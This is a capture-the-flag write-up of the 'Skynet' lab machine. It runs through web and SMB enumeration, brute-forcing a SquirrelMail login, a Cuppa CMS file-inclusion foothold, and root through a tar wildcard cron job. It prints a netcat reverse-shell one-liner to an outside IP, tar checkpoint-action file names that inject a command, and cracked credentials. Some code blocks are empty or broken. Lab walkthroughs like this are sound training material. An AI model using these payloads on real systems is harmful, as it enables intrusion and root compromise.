## Enumeration
### 1. Web
Started gobuster to enumerate the directory while we navigate to the webserver on port 80.\
We were greeted with a blank search page resembling Google search.

![skynet landing page](./img/skynet_webserver.png)

However, the search feature is not working and checking the dev console tells us that our queries were not passed along with the http request. There was also no javascript on the page, indicating that the page is just a plain html form with no actions.

![request data](./img/request_data.png)

Our gobuster scan has returned some interesting directories to explore.

```
Except for /squirrelmail, the rest of the directories were forbidden and not accessible to not unauthenticated users.\
Navigating to /squirrelmail, we see login page for squirrelmail.\
![squirrel mail login page](./img/squirrelmail_login_page.png)

Unable to find any default credentials for squrrielmail, we move on to enumerate other ports on the machine.

### 2. SMB
We were able to list smb folders using null credentials.
```
smbclient --no-pass -L 10.10.59.36      

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET
```

We also successfully connected to the anonymous shared folder without credentials.\
We then listed the shared folder contents and downloaded them onto our attacker machine.
```
smbclient --no-pass //10.10.234.143/anonymous

```
The attention.txt file seems to be a note from the administrator to all employees about a system malfunction which changed their passwords. It also gave us some hints about the administrator's username. The log1.txt file contains a list of strings that look like passwords.
```
# attention.txt
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
With a username and a potential list of passwords, we launched a brute force attack on the squrrielmail login page. To do this, we had to intercept the http request using BurpSuite and modify the request to be acceptable by hydra.\
Hydra returned the credentials milesdyson:cyborg007haloterminator
```

We logged onto squirrelmail with milesdyson's account and found an email in his inbox saying that his SMB password has been changed to: )s{A&2Z=F^n_E.B`\
With that we were able to log into his personal smb share and located a file named important.txt.\
The contents of the file tells us that there is a beta CMS located at /45kra24zxs28v3yd
```
# important.txt
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
Navigating to the hidden directory, we were greeted with Miles' personal page.\
![miles dyson personal page](./img/miles_dyson_personal_page.png)

## Exploitation phase
Next we switch gears to look for an exploit to gain an initial foothold onto the machine.\
We found a RCE vulnerability (CVE-2017-7692) for [SquirrelMail 1.4.23](https://github.com/xl7dev/Exploit/blob/master/SquirrelMail/SquirrelMail_RCE_exploit.sh).\
Unfortunately the exploit script did not work.

We continued to enumerate the hidden folder /45kra24zxs28v3yd and found an administrator login panel at /45kra24zxs28v3yd/administrator.

![cuppa cms admin panel](./img/cuppa_cms_admin_panel.png)

Researching Cuppa CMS, we found a [Local/Remote File Inclusion vulnerability](https://www.exploit-db.com/exploits/25971) and tried the payload to print /etc/passwd.\
The payload worked, indicating that the server is vulnerable.\
![/etc/passwd](./img/etc_passwd.png)

Next we used the remote file inclusion method to gain initial foothold into the machine and we saw that we were logged in as www-data.\
```

```
## Escalate privileges
After looking around the machine, we noticed that there is a backup.sh script that executes every minute, it also executes with root permissions.\
As we don't have permissions to edit the script or the containing folder, we continued looking around and found out about [tar privilege escalation](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/) for cronjobs.

To escalate our priviledges to root, the article suggests three commands to be executed in the destination directory of the tar command.
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc 10.10.10.10 4445 >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
### Gaining root
After setting up a netcat listener and executing the three commands, we finally gained root access into our machine.
```
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
